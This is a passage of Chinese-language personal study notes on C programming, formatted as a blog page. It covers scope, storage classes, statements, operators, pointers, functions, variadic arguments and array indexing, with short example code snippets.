<h4 id="3-1-2-浮点类型"><a href="#3-1-2-浮点类型" class="headerlink" title="3.1.2 浮点类型"></a>3.1.2 浮点类型</h4><h4 id="3-1-3-指针"><a href="#3-1-3-指针" class="headerlink" title="3.1.3 指针"></a>3.1.3 指针</h4><p>每个内存位置都由地址唯一确认并使用.<br>指针只是地址的另一个名字.<br>指针变量就是一个其值为另外一个（一些）内存地址的变量<br>使用字符串常量会生成一个“指向字符的常量指针”，当一个字符串常量出现于一个表达式时，表达式所使用的值就是这些字符所存的地址。因此，可以把字符串常量赋值给一个“指向字符的指针”，后者指向这些字符所存储的地址.<br>不能把字符串常量赋值给一个字符数组，因为字符串常量的直接值是一个指针，而不是字符本身.<br>所以调用库函数操纵.</p>
<h3 id="3-2-基本声明"><a href="#3-2-基本声明" class="headerlink" title="3.2 基本声明"></a>3.2 基本声明</h3><h4 id="3-2-1-初始化"><a href="#3-2-1-初始化" class="headerlink" title="3.2.1 初始化"></a>3.2.1 初始化</h4><h4 id="3-2-2-声明简单数组"><a href="#3-2-2-声明简单数组" class="headerlink" title="3.2.2 声明简单数组"></a>3.2.2 声明简单数组</h4><h4 id="3-2-3-声明指针"><a href="#3-2-3-声明指针" class="headerlink" title="3.2.3 声明指针"></a>3.2.3 声明指针</h4><h3 id="3-3-typedef"><a href="#3-3-typedef" class="headerlink" title="3.3 typedef"></a>3.3 typedef</h3><p>结构方面<br>应该使用tupedef而不是#define来创建新的类型名，因为后者</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> d_ptr_to_char char *</span></span><br><span class="line">d_ptr_to_char  a, b</span><br><span class="line">正确的声明了a但b却被声明为一个字符，在关于指针是，用<span class="keyword">typedef</span>更为合适</span><br></pre></td></tr></table></figure>

<h3 id="3-4-常量"><a href="#3-4-常量" class="headerlink" title="3.4 常量"></a>3.4 常量</h3><p>const</p>
<h3 id="3-5-作用域（scope）"><a href="#3-5-作用域（scope）" class="headerlink" title="3.5 作用域（scope）"></a>3.5 作用域（scope）</h3><p>局部变量局部访问</p>
<p>四种类型:</p>
<ul>
<li>代码块:{}  之间的——可以被里面的所有语句访问<br>文件:全局声明的标识符<br>原型:只适用于在函数原型中声明的参数名<br>函数:一个函数中的所有语句标签必须唯一</li>
</ul>
<h4 id="3-5-1-代码块作用域"><a href="#3-5-1-代码块作用域" class="headerlink" title="3.5.1 代码块作用域"></a>3.5.1 代码块作用域</h4><p>避免在嵌套的代码块中出现相同的变量名</p>
<h4 id="3-5-2-文件作用域"><a href="#3-5-2-文件作用域" class="headerlink" title="3.5.2 文件作用域"></a>3.5.2 文件作用域</h4><p>全局</p>
<h4 id="3-5-3-原型作用域"><a href="#3-5-3-原型作用域" class="headerlink" title="3.5.3 原型作用域"></a>3.5.3 原型作用域</h4><p>参数名冲突</p>
<h4 id="3-5-4-函数作用域"><a href="#3-5-4-函数作用域" class="headerlink" title="3.5.4 函数作用域"></a>3.5.4 函数作用域</h4><p>只适用于语句标签，语句标签用于goto语句，即一个函数中的所有语句标签必须唯一</p>
<h3 id="3-6-链接属性-如何处理在不同文件中的标识符"><a href="#3-6-链接属性-如何处理在不同文件中的标识符" class="headerlink" title="3.6 链接属性(如何处理在不同文件中的标识符)"></a>3.6 链接属性(如何处理在不同文件中的标识符)</h3><p>external(外部):表示同一个实体<br>internal(内部)<br>none(无):单独的个体</p>
<h3 id="3-7-存储类型"><a href="#3-7-存储类型" class="headerlink" title="3.7 存储类型"></a>3.7 存储类型</h3><p>指存储变量值的内存类型–决定变量何时创建、何时销毁、它的值将保存多久。<br>存储变量的3个地方:普通内存、运行时堆栈、硬件寄存器。（不同地方有不同的特性）<br>auto static register extern</p>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>静止变量:0<br>自动变量:垃圾值</p>
<h3 id="3-8-static关键字"><a href="#3-8-static关键字" class="headerlink" title="3.8 static关键字"></a>3.8 static关键字</h3><p>见3.7</p>
<h3 id="3-9-作用域、存储类型示例"><a href="#3-9-作用域、存储类型示例" class="headerlink" title="3.9 作用域、存储类型示例"></a>3.9 作用域、存储类型示例</h3><h3 id="3-10-总结"><a href="#3-10-总结" class="headerlink" title="3.10 总结"></a>3.10 总结</h3><h3 id="3-11-警告的总结"><a href="#3-11-警告的总结" class="headerlink" title="3.11 警告的总结"></a>3.11 警告的总结</h3><h3 id="3-12-编程提示的总结"><a href="#3-12-编程提示的总结" class="headerlink" title="3.12 编程提示的总结"></a>3.12 编程提示的总结</h3><h3 id="3-13-问题"><a href="#3-13-问题" class="headerlink" title="3.13 问题"></a>3.13 问题</h3><h2 id="第四章-语句"><a href="#第四章-语句" class="headerlink" title="第四章 语句"></a>第四章 语句</h2><h3 id="4-1-空语句"><a href="#4-1-空语句" class="headerlink" title="4.1 空语句"></a>4.1 空语句</h3><p>只包含一个分号</p>
<h3 id="4-2-表达式语句"><a href="#4-2-表达式语句" class="headerlink" title="4.2 表达式语句"></a>4.2 表达式语句</h3><p>&#x3D; &#x3D;&#x3D;</p>
<h3 id="4-3-代码块"><a href="#4-3-代码块" class="headerlink" title="4.3 代码块"></a>4.3 代码块</h3><p>{}</p>
<h3 id="4-4-if语句"><a href="#4-4-if语句" class="headerlink" title="4.4 if语句"></a>4.4 if语句</h3><p>当else悬空，找最近的</p>
<h3 id="4-5-while语句"><a href="#4-5-while语句" class="headerlink" title="4.5 while语句"></a>4.5 while语句</h3><p>循环的测试在循环体开始<strong>之前</strong>进行</p>
<h4 id="4-5-1-break和continue语句"><a href="#4-5-1-break和continue语句" class="headerlink" title="4.5.1 break和continue语句"></a>4.5.1 break和continue语句</h4><p>break:<strong>永久</strong>终止循环，跳出循环<br>continue:结束<strong>当前</strong>循环，进行测试，判断是否进入下一次循环</p>
<h4 id="4-5-2-while语句的执行过程"><a href="#4-5-2-while语句的执行过程" class="headerlink" title="4.5.2 while语句的执行过程"></a>4.5.2 while语句的执行过程</h4><h3 id="4-6-for语句"><a href="#4-6-for语句" class="headerlink" title="4.6 for语句"></a>4.6 for语句</h3><p>便于把所有用于操纵循环的表达式收集在一起，便于寻找。</p>
<h3 id="4-7-do语句"><a href="#4-7-do语句" class="headerlink" title="4.7 do语句"></a>4.7 do语句</h3><p><strong>至少执行一次</strong></p>
<h3 id="4-8-switch"><a href="#4-8-switch" class="headerlink" title="4.8 switch"></a>4.8 switch</h3><h4 id="4-8-1-switch中的break语句"><a href="#4-8-1-switch中的break语句" class="headerlink" title="4.8.1 switch中的break语句"></a>4.8.1 switch中的break语句</h4><p>最后一个case其实不用，只是以后是维护方便</p>
<h4 id="4-8-2-default子句"><a href="#4-8-2-default子句" class="headerlink" title="4.8.2 default子句"></a>4.8.2 default子句</h4><p>所有的值都不跟case匹配<br>可以用于检测任何非法值</p>
<h4 id="4-8-3-switch语句的执行过程"><a href="#4-8-3-switch语句的执行过程" class="headerlink" title="4.8.3 switch语句的执行过程"></a>4.8.3 switch语句的执行过程</h4><h3 id="4-9-goto语句"><a href="#4-9-goto语句" class="headerlink" title="4.9 goto语句"></a>4.9 goto语句</h3><p>尽量不用</p>
<h3 id="4-10-总结"><a href="#4-10-总结" class="headerlink" title="4.10 总结"></a>4.10 总结</h3><h3 id="4-11-警告的总结"><a href="#4-11-警告的总结" class="headerlink" title="4.11 警告的总结"></a>4.11 警告的总结</h3><h3 id="4-12-编程提示的总结"><a href="#4-12-编程提示的总结" class="headerlink" title="4.12 编程提示的总结"></a>4.12 编程提示的总结</h3><h3 id="4-11-问题"><a href="#4-11-问题" class="headerlink" title="4.11 问题"></a>4.11 问题</h3><h3 id="4-11-编程练习"><a href="#4-11-编程练习" class="headerlink" title="4.11 编程练习"></a>4.11 编程练习</h3><h2 id="第五章-操作符和表达式"><a href="#第五章-操作符和表达式" class="headerlink" title="第五章 操作符和表达式"></a>第五章 操作符和表达式</h2><p>operator</p>
<h3 id="5-1-操作符"><a href="#5-1-操作符" class="headerlink" title="5.1 操作符"></a>5.1 操作符</h3><p>按照优先级分组</p>
<h4 id="5-1-1-算术操作符"><a href="#5-1-1-算术操作符" class="headerlink" title="5.1.1 算术操作符"></a>5.1.1 算术操作符</h4><pre><code>+ - * / %
</code></pre>
<h4 id="5-1-2-移位操作符"><a href="#5-1-2-移位操作符" class="headerlink" title="5.1.2 移位操作符"></a>5.1.2 移位操作符</h4><p>&lt;&lt; &gt;&gt;必须为整形<br>不可用a &lt;&lt; -5<br>右移位:逻辑移位和算数移位（当操作值为-（即最高位为1）时，不同）<br>逻辑移位:用0补充(与左移位相同)<br>算术移位:移入的位由先前该值的符号位决定，1 1|| 0 0</p>
<h4 id="5-1-3-位操作符"><a href="#5-1-3-位操作符" class="headerlink" title="5.1.3 位操作符"></a>5.1.3 位操作符</h4><p>AND<br>OR<br>XOR</p>
<h4 id="5-1-4-赋值操作符"><a href="#5-1-4-赋值操作符" class="headerlink" title="5.1.4 赋值操作符"></a>5.1.4 赋值操作符</h4><p>+&#x3D;效率更高</p>
<h4 id="5-1-5-单目操作符"><a href="#5-1-5-单目操作符" class="headerlink" title="5.1.5 单目操作符"></a>5.1.5 单目操作符</h4><p>！求反<br>&amp;产生操作数的地址<br>~求补1-0 0-1</p>
<h4 id="5-1-6-关系操作符"><a href="#5-1-6-关系操作符" class="headerlink" title="5.1.6 关系操作符"></a>5.1.6 关系操作符</h4><p><strong>C用整数代替布尔类型</strong><br>if（a）&#x3D;if(a!&#x3D;0)<br>if (a&#x3D;&#x3D;0)&#x3D;if（！a）</p>
<h4 id="5-1-7-逻辑操作符"><a href="#5-1-7-逻辑操作符" class="headerlink" title="5.1.7 逻辑操作符"></a>5.1.7 逻辑操作符</h4><p>&amp;&amp;:比&gt; &lt;都要低 ，如果左边的值非零则不再求值<br>||：如果左边的值为1，则直接输出<br>被称为短路求值–测0和非0</p>
<h4 id="5-1-8-条件操作符"><a href="#5-1-8-条件操作符" class="headerlink" title="5.1.8 条件操作符"></a>5.1.8 条件操作符</h4><p>表达式1?表达式2:表达式3<br>优先级很低，一般不加括号也没有问题</p>
<h4 id="5-1-9-逗号操作符"><a href="#5-1-9-逗号操作符" class="headerlink" title="5.1.9 逗号操作符"></a>5.1.9 逗号操作符</h4><p>a,b,c逗号操作用于将两个或多个表达式分割开来，自左向右逐个求值，即输出的值为最后一个值（c）<br>也有优点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span>(a&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  a=get();</span><br><span class="line">  asd(a);</span><br><span class="line">&#125;</span><br><span class="line">变为</span><br><span class="line"><span class="keyword">while</span>(a=get(),asd(a),a&gt;<span class="number">0</span>) 易于维护</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-1-10-下标引用、函数调用和结构成员"><a href="#5-1-10-下标引用、函数调用和结构成员" class="headerlink" title="5.1.10 下标引用、函数调用和结构成员"></a>5.1.10 下标引用、函数调用和结构成员</h4><h5 id="下标引用"><a href="#下标引用" class="headerlink" title="下标引用"></a>下标引用</h5><p>下标:[] ——并不仅限于数组名<br>下标引用接受两个操作数:数组名和索引值<br>下标值总是从零开始，不会对下标值进行有效检查。<br> array[]——*（array+1）等价（优先级不同）</p>
<h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5><p>函数调用接受一个或者多个操作数。第一个是希望调用的函数名，剩余的操作数就是传递给函数的参数。<br>将函数调用以操作符的方式实现——表达式可以代替常量（第七章）</p>
<h5 id="结构成员"><a href="#结构成员" class="headerlink" title="结构成员"></a>结构成员</h5><p>. -&gt;都用于访问一个结构的成员。<br>若s是个结构变量，s.a访问s中叫a的成员<br>若s是个指向结构的指针，用-&gt;访问其内容</p>
<h3 id="5-2-布尔值"><a href="#5-2-布尔值" class="headerlink" title="5.2 布尔值"></a>5.2 布尔值</h3><p>C 不具备显式的布尔类型，用整数代替<br>0是假，其余为真</p>
<h3 id="5-3-左值和右值"><a href="#5-3-左值和右值" class="headerlink" title="5.3 左值和右值"></a>5.3 左值和右值</h3><p>a&#x3D;b+25;<br>a可为左右值，b只可为右值</p>
<h3 id="5-4-表达式求值"><a href="#5-4-表达式求值" class="headerlink" title="5.4 表达式求值"></a>5.4 表达式求值</h3><p>类型转换</p>
<h4 id="5-4-1-隐式类型转换"><a href="#5-4-1-隐式类型转换" class="headerlink" title="5.4.1 隐式类型转换"></a>5.4.1 隐式类型转换</h4><h4 id="5-4-2-算术转换"><a href="#5-4-2-算术转换" class="headerlink" title="5.4.2 算术转换"></a>5.4.2 算术转换</h4><h4 id="5-4-3-操作符的属性"><a href="#5-4-3-操作符的属性" class="headerlink" title="5.4.3 操作符的属性"></a>5.4.3 操作符的属性</h4><p>lexp:左值表达式——位置<br>rexp:右值表达式——值</p>
<h4 id="5-4-4-优先级和求值的顺序"><a href="#5-4-4-优先级和求值的顺序" class="headerlink" title="5.4.4 优先级和求值的顺序"></a>5.4.4 优先级和求值的顺序</h4><p>使用临时变量，让函数调用再单独的语句中进行</p>
<h3 id="5-5-总结"><a href="#5-5-总结" class="headerlink" title="5.5 总结"></a>5.5 总结</h3><h3 id="5-6-警告的总结"><a href="#5-6-警告的总结" class="headerlink" title="5.6 警告的总结"></a>5.6 警告的总结</h3><h3 id="5-7-编程提示的总结"><a href="#5-7-编程提示的总结" class="headerlink" title="5.7 编程提示的总结"></a>5.7 编程提示的总结</h3><h3 id="5-8-问题"><a href="#5-8-问题" class="headerlink" title="5.8 问题"></a>5.8 问题</h3><h3 id="5-9-编程练习"><a href="#5-9-编程练习" class="headerlink" title="5.9 编程练习"></a>5.9 编程练习</h3><h2 id="第六章-指针"><a href="#第六章-指针" class="headerlink" title="第六章 指针"></a><strong>第六章 指针</strong></h2><p>基础</p>
<h3 id="6-1-内存和地址"><a href="#6-1-内存和地址" class="headerlink" title="6.1 内存和地址"></a>6.1 内存和地址</h3><p>位——字节——int<br>10亿&#x3D;4G<br>硬件事项:边界对齐——int存储的起始位置只是特定的字节（通常是2&#x2F;4的倍数）<br>·内存中每个位置都有唯一的地址标识<br>·内存中的每个位置都包含一个值<br>高级语言通过名字来访问内存位置——a,b(即变量)——编译器来实现<br>硬件仍然通过地址访问内存位置</p>
<h3 id="6-2-值和类型"><a href="#6-2-值和类型" class="headerlink" title="6.2 值和类型"></a>6.2 值和类型</h3><h3 id="6-3-指针变量的内容"><a href="#6-3-指针变量的内容" class="headerlink" title="6.3 指针变量的内容"></a>6.3 指针变量的内容</h3><h3 id="6-4-间接访问操作符"><a href="#6-4-间接访问操作符" class="headerlink" title="6.4 间接访问操作符"></a>6.4 间接访问操作符</h3><p>*：间接访问&#x2F;解引用指针</p>
<h3 id="6-5-未初始化和非法的指针"><a href="#6-5-未初始化和非法的指针" class="headerlink" title="6.5 未初始化和非法的指针"></a>6.5 未初始化和非法的指针</h3><p>声明一个指针变量并不会自动分配内存<br>初始化</p>
<h3 id="6-6-NULL指针"><a href="#6-6-NULL指针" class="headerlink" title="6.6 NULL指针"></a>6.6 NULL指针</h3><p>不指向任何东西,对NULL * 是非法的(ERROR)，不可传递</p>
<h3 id="6-7-指针、间接访问和左值"><a href="#6-7-指针、间接访问和左值" class="headerlink" title="6.7 指针、间接访问和左值"></a>6.7 指针、间接访问和左值</h3><h3 id="6-8-指针、间接访问和变量"><a href="#6-8-指针、间接访问和变量" class="headerlink" title="6.8 指针、间接访问和变量"></a>6.8 指针、间接访问和变量</h3><p><em>&amp;a&#x3D;25;<br>&amp;产生a的地址，</em>访问地址——等价于a&#x3D;25;</p>
<h3 id="6-9-指针变量"><a href="#6-9-指针变量" class="headerlink" title="6.9 指针变量"></a>6.9 指针变量</h3><h3 id="6-10-指针的指针"><a href="#6-10-指针的指针" class="headerlink" title="6.10 指针的指针"></a>6.10 指针的指针</h3><p>**c:二级指针</p>
<h3 id="6-11-指针表达式"><a href="#6-11-指针表达式" class="headerlink" title="6.11 指针表达式"></a>6.11 指针表达式</h3><p>char ch&#x3D;’a’;<br>char <em>cp&#x3D;&amp;ch;<br>1.&amp;ch cp  &amp;cp</em>cp<br>2.<em>cp+1</em>(cp+1)<br>3.++cp cp++ <em>++cp</em>cp++ (<em>cp)++<br>4.++</em>++cp   ++*cp++</p>
<h3 id="6-12-实例"><a href="#6-12-实例" class="headerlink" title="6.12 实例"></a>6.12 实例</h3><h3 id="6-13-指针运算"><a href="#6-13-指针运算" class="headerlink" title="6.13 指针运算"></a>6.13 指针运算</h3><p>当一个指针和一个整数量执行算数运算时，整数在执行加法运算前会调整——指针所指向类型的大小.</p>
<h4 id="6-13-1-算术运算"><a href="#6-13-1-算术运算" class="headerlink" title="6.13.1 算术运算"></a>6.13.1 算术运算</h4><p>指针+-整数<br>指针-指针（两个指针都指向同一个数组中的元素中）&#x3D;减值&#x2F;元素长度</p>
<h4 id="6-13-2-关系运算"><a href="#6-13-2-关系运算" class="headerlink" title="6.13.2 关系运算"></a>6.13.2 关系运算</h4><p>避免使用</p>
<h3 id="6-14-总结"><a href="#6-14-总结" class="headerlink" title="6.14 总结"></a>6.14 总结</h3><h3 id="6-15-编程练习"><a href="#6-15-编程练习" class="headerlink" title="6.15 编程练习"></a>6.15 编程练习</h3><h3 id="6-16-编程提示的总结"><a href="#6-16-编程提示的总结" class="headerlink" title="6.16 编程提示的总结"></a>6.16 编程提示的总结</h3><h3 id="6-17-问题"><a href="#6-17-问题" class="headerlink" title="6.17 问题"></a>6.17 问题</h3><h3 id="6-18-编程练习"><a href="#6-18-编程练习" class="headerlink" title="6.18 编程练习"></a>6.18 编程练习</h3><h2 id="第七章-函数"><a href="#第七章-函数" class="headerlink" title="第七章 函数"></a>第七章 函数</h2><h3 id="7-1-函数定义"><a href="#7-1-函数定义" class="headerlink" title="7.1 函数定义"></a>7.1 函数定义</h3><p>函数：函数体的实现<br>函数体：一个代码块，被调用时执行<br>被调用时，返回——实现一种有用的存根目的（为尚未实现的代码保留一个位置）——保持完整性<br>void:无返回值<br>return 0 || return (0)</p>
<h3 id="7-2-函数声明"><a href="#7-2-函数声明" class="headerlink" title="7.2 函数声明"></a>7.2 函数声明</h3><h4 id="7-2-1-原型"><a href="#7-2-1-原型" class="headerlink" title="7.2.1 原型"></a>7.2.1 原型</h4><h4 id="7-2-2-函数的缺省认定"><a href="#7-2-2-函数的缺省认定" class="headerlink" title="7.2.2 函数的缺省认定"></a>7.2.2 函数的缺省认定</h4><p>没有见到原型，认定为整型</p>
<h3 id="7-3-函数的参数"><a href="#7-3-函数的参数" class="headerlink" title="7.3 函数的参数"></a>7.3 函数的参数</h3><p>传值调用:函数获得参数值的一份拷贝,不会改变实参.<br>传址调用:被传递的参数是一个数组名并使用下标引用该数组的参数——数组名实际上是一个指针，下标引用是间接访问的另一种方式.</p>
<h3 id="7-4-ADT和黑盒"><a href="#7-4-ADT和黑盒" class="headerlink" title="7.4 ADT和黑盒"></a>7.4 ADT和黑盒</h3><p>C可用于设计和实现抽象数据类型(ADT,Abstract Data Type),可以限制函数和数据定义的作用域(static).——黑盒设计.<br>黑盒实现细节与外界隔绝，访问的唯一方法是通过模块所定义的接口.<br>模块具有功能说明(模块所执行的任务)和接口说明(模块的使用).</p>
<h3 id="7-5-递归"><a href="#7-5-递归" class="headerlink" title="7.5 递归"></a>7.5 递归</h3><p>C通过运行时堆栈支持递归函数（直接或间接调用自身的函数）的实现.<br>效率低，简单，不去追究细节的实现过程</p>
<h4 id="7-5-1-追踪递归函数"><a href="#7-5-1-追踪递归函数" class="headerlink" title="7.5.1 追踪递归函数"></a>7.5.1 追踪递归函数</h4><p>理解函数所声明的变量是如何存储的!<br>当函数被调用时，它的变量的空间是创建于运行时堆栈上的，以前调用的函数的变量仍保留在堆栈上,但被新函数的变量所覆盖，无法访问.<br>就是一个循环覆盖的过程，区分分属不同的区.<br>当重复调用结束时（类似循环）（不同的是，会保存堆栈中的变量值），开始打印输出，return，并开始销毁堆栈上的变量值.</p>
<h4 id="7-5-2-递归与迭代"><a href="#7-5-2-递归与迭代" class="headerlink" title="7.5.2 递归与迭代"></a>7.5.2 递归与迭代</h4><p>递归的两个特性:存在限制条件，使递归stop<br>逐渐趋近<br>递归的开销:参数必须压到堆栈中、为局部变量分配内存空间、寄存器的值必须保存.<br>迭代实现:可读性稍差,但效率更高.<br>即使用循环和交换值</p>
<h3 id="7-6-可变参数列表"><a href="#7-6-可变参数列表" class="headerlink" title="7.6 可变参数列表"></a>7.6 可变参数列表</h3><p>函数原型只能显示固定数目的参数,考虑实现让一个函数在不同的时候接受不同数目的参数，当然，有一些限制.<br>即需要一种机制，能够以一种良好的方法访问数量未定的参数列表.</p>
<h4 id="7-6-1-stdarg宏"><a href="#7-6-1-stdarg宏" class="headerlink" title="7.6.1 stdarg宏"></a>7.6.1 stdarg宏</h4><p>这就是解决办法,宏定义于stdarg.h头文件，是标准库中的一部分.<br>这个库声明了一个类型va_list和三个宏——va_start、va_arg、va_end,相互配合，访问参数的值</p>
<h4 id="7-6-2-可变参数的限制"><a href="#7-6-2-可变参数的限制" class="headerlink" title="7.6.2 可变参数的限制"></a>7.6.2 可变参数的限制</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="type">float</span> <span class="title function_">average</span><span class="params">( <span class="type">int</span> n_values,....)</span></span><br><span class="line">&#123;</span><br><span class="line">   va_list   var_arg;</span><br><span class="line">   <span class="type">int</span>   count;</span><br><span class="line">   <span class="type">float</span> sum = <span class="number">0</span> ;</span><br><span class="line">   va_start(var_arg,n_values );<span class="comment">//访问可变参数</span></span><br><span class="line">   <span class="keyword">for</span>(count = <span class="number">0</span>; count &lt; n; count +=<span class="number">1</span> )<span class="comment">//添加取自可变参数列表的值.</span></span><br><span class="line">   &#123;</span><br><span class="line">      sum += va_arg( var_arg, <span class="type">int</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   va_end( var_arg);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> sum / n_values;</span><br><span class="line">&#125;</span><br><span class="line">很危险，因为都是缺省认定</span><br></pre></td></tr></table></figure>

<h3 id="7-7-总结"><a href="#7-7-总结" class="headerlink" title="7.7 总结"></a>7.7 总结</h3><h3 id="7-8-警告的总结"><a href="#7-8-警告的总结" class="headerlink" title="7.8 警告的总结"></a>7.8 警告的总结</h3><h3 id="7-9-编程提示的总结"><a href="#7-9-编程提示的总结" class="headerlink" title="7.9 编程提示的总结"></a>7.9 编程提示的总结</h3><h3 id="7-10-问题"><a href="#7-10-问题" class="headerlink" title="7.10 问题"></a>7.10 问题</h3><h3 id="7-11-编程练习"><a href="#7-11-编程练习" class="headerlink" title="7.11 编程练习"></a>7.11 编程练习</h3><h2 id="第八章-数组"><a href="#第八章-数组" class="headerlink" title="第八章 数组"></a>第八章 数组</h2><p>多维数组、指针、初始化</p>
<h3 id="8-1-一堆数组"><a href="#8-1-一堆数组" class="headerlink" title="8.1 一堆数组"></a>8.1 一堆数组</h3><h4 id="8-1-1-数组名"><a href="#8-1-1-数组名" class="headerlink" title="8.1.1 数组名"></a>8.1.1 数组名</h4><p>int b[4];<br>b是什么？——  b表示整个数组，错.b是一个指针<strong>常量</strong>,是数组第一个元素的地址，类型取决于数组元素的类型.<br>(常量的值不能修改)why?——在程序完成链接后，数组的位置固定，当程序运行时，便无法移动<br>数组具有确定数量的元素，而指针只是一个标量值,当数组名使用时，编译器才会为它产生一个指针常量.<br>有两种情况，数组名不用指针常量来表示:<br>1.数组名作为sizeof操作符或单目操作符&amp;.<br>sizeof返回整个数组的长度（不是指针的长度）,&amp;数组名产生一个指向数组的指针（不是指向某个指针常量值的指针）</p>
<h4 id="8-1-2-下标引用"><a href="#8-1-2-下标引用" class="headerlink" title="8.1.2 下标引用"></a>8.1.2 下标引用</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>   <span class="built_in">array</span>[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span>   *ap = <span class="built_in">array</span> + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">ap              <span class="built_in">array</span>+<span class="number">2</span> = &amp;<span class="built_in">array</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">*ap             <span class="built_in">array</span>[<span class="number">2</span>] = *(<span class="built_in">array</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ap[<span class="number">0</span>]           *(ap+(<span class="number">0</span>))=<span class="built_in">array</span>[<span class="number">2</span>]</span><br><span class="line">                不要惯性思维，C的下标引用等价于间接访问</span><br><span class="line"></span><br><span class="line">ap+<span class="number">6</span>            <span class="built_in">array</span>+<span class="number">8</span>=&amp;<span class="built_in">array</span>[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">*ap+<span class="number">6</span>           <span class="built_in">array</span>[<span class="number">2</span>]+<span class="number">6</span></span><br><span class="line"></span><br><span class="line">*(ap+<span class="number">6</span>)         <span class="built_in">array</span>[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">ap[<span class="number">6</span>]           *(ap+<span class="number">6</span>)=<span class="built_in">array</span>[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">&amp;ap             合法但目前不知道ap在哪里</span><br><span class="line"></span><br><span class="line">ap[<span class="number">-1</span>]          <span class="built_in">array</span>[<span class="number">2</span><span class="number">-1</span>]=<span class="built_in">array</span>[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ap[<span class="number">9</span>]           非法，但很多编译器不报错，而且不检查相应下标错误，可能会随机给出数字</span><br></pre></td></tr></table></figure>

<h4 id="8-1-3-指针与下标"><a href="#8-1-3-指针与下标" class="headerlink" title="8.1.3 指针与下标"></a>8.1.3 指针与下标</h4><p> <strong>下标绝对不会比指针更有效率，但有时候指针会比下标更有效率</strong></p>
<h4 id="8-1-4-指针的效率"><a href="#8-1-4-指针的效率" class="headerlink" title="8.1.4 指针的效率"></a>8.1.4 指针的效率</h4><p>正确的使用指针</p>
<h4 id="8-1-5-数组和指针"><a href="#8-1-5-数组和指针" class="headerlink" title="8.1.5 数组和指针"></a>8.1.5 数组和指针</h4><h4 id="8-1-6-作为函数参数的数组名"><a href="#8-1-6-作为函数参数的数组名" class="headerlink" title="8.1.6 作为函数参数的数组名"></a>8.1.6 作为函数参数的数组名</h4><p>C里面所有的参数传递都是传值的方式，指针能通过间接访问更改实参的值，是因为数组的传值调用传递的是参数的一份副本，可以自由操纵<br>eg: *string++<br>取得string所指向的那个字符，并修改string，使其指向下一个字符</p>
<h4 id="8-1-7-声明数组参数"><a href="#8-1-7-声明数组参数" class="headerlink" title="8.1.7 声明数组参数"></a>8.1.7 声明数组参数</h4><h4 id="8-1-8-初始化"><a href="#8-1-8-初始化" class="headerlink" title="8.1.8 初始化"></a>8.1.8 初始化</h4><h4 id="8-1-9-不完整的初始化"><a href="#8-1-9-不完整的初始化" class="headerlink" title="8.1.9 不完整的初始化"></a>8.1.9 不完整的初始化</h4><h4 id="8-1-10-自动计算数组长度"><a href="#8-1-10-自动计算数组长度" class="headerlink" title="8.1.10 自动计算数组长度"></a>8.1.10 自动计算数组长度</h4><h4 id="8-1-11-字符数组的初始化"><a href="#8-1-11-字符数组的初始化" class="headerlink" title="8.1.11 字符数组的初始化"></a>8.1.11 字符数组的初始化</h4><h3 id="8-2-多维数组"><a href="#8-2-多维数组" class="headerlink" title="8.2 多维数组"></a>8.2 多维数组</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> c[<span class="number">6</span>][<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> d[<span class="number">6</span>][<span class="number">6</span>][<span class="number">10</span>];</span><br></pre></td></tr></table></figure>

<p>a是一个简单的整数，增加了一个维数，b是一个向量，包含10个整型元素.<br>c只是在b的基础上再增加一维，c可以看成一个包含6个元素的向量，只不过它的每个元素本身是一个包含10个整型元素的数组。<br>d就是一个3排、6行、10列的整型三维数组.</p>
<h4 id="8-2-1-存储顺序"><a href="#8-2-1-存储顺序" class="headerlink" title="8.2.1 存储顺序"></a>8.2.1 存储顺序</h4><p>在C中，多维数组的元素存储顺序按照最右下标率先变化的原则，称为行主序.<br>遵守数组元素的实际存储方式.</p>
<h4 id="8-2-2-数组名"><a href="#8-2-2-数组名" class="headerlink" title="8.2.2 数组名"></a>8.2.2 数组名</h4><h4 id="8-2-3-下标"><a href="#8-2-3-下标" class="headerlink" title="8.2.3 下标"></a>8.2.3 下标</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> matrix[<span class="number">3</span>][<span class="number">10</span>]</span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">5</span>]</span><br><span class="line">matrix                     类型:指向包含<span class="number">10</span>个整型元素的数组的指针</span><br><span class="line">                           值:指向包含<span class="number">10</span>个整形元素的第一个子数组</span><br><span class="line"></span><br><span class="line">matrix + <span class="number">1</span>                 指向matrix的另一行</span><br><span class="line">                           注意<span class="number">1</span>是根据数组的长度进行调整</span><br><span class="line"></span><br><span class="line">*(matrix + <span class="number">1</span>)              下一行的数组的第一个元素</span><br><span class="line">                           =matrix[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">*(matrix + <span class="number">1</span>) + <span class="number">5</span>          下一行的数组的第六个元素</span><br><span class="line"></span><br><span class="line">*(*(matrix + <span class="number">1</span>) + <span class="number">5</span>)       即*(matrix[<span class="number">1</span>]+<span class="number">5</span>)</span><br><span class="line">                           即matrix[<span class="number">1</span>][<span class="number">5</span>]</span><br><span class="line">          